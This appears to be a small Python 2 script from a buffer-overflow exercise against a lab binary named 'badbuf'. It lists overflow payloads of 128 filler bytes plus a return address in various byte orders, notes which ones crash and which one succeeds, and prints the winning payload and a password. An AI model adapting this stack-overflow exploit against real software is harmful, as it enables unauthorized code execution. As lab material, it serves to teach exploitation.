# name
#
# Disassemble the current memory contents there.

# Address of the good string
#
# From `disassemble main` inside `gdb badbuf`
#
# with new lines:
# bytes = [0x49,0x66,0x64]
# without new lines:
bytes = [0x49,0x64,0xa4]

inputs = [
# junk: NOT the same as 3rd option because here we write null over 0x64
  ('a'*128 + chr(bytes[2]))

# segfault
, ('a'*128 + ''.join(map(chr,bytes)))

# success! this depends critically on endianness
, ('a'*128 + ''.join(map(chr,reversed(bytes))))

# segfault
, ('a'*128 + 'b'*5 + ''.join(map(chr,reversed(bytes))))

# segfault
, ('a'*128 + 'b'*1 + ''.join(map(chr,reversed(bytes))))

# segfault
, ('a'*128 + ''.join(map(chr,reversed(bytes))) + 'b'*5)

# segfault
, ('a'*128 + ''.join(map(chr,bytes)) + 'b'*5)

# segfault
, ('a'*128 + ''.join(map(chr,bytes)) + 'b'*1) ]

print inputs[2]

# pw
print 'ownz_u!'
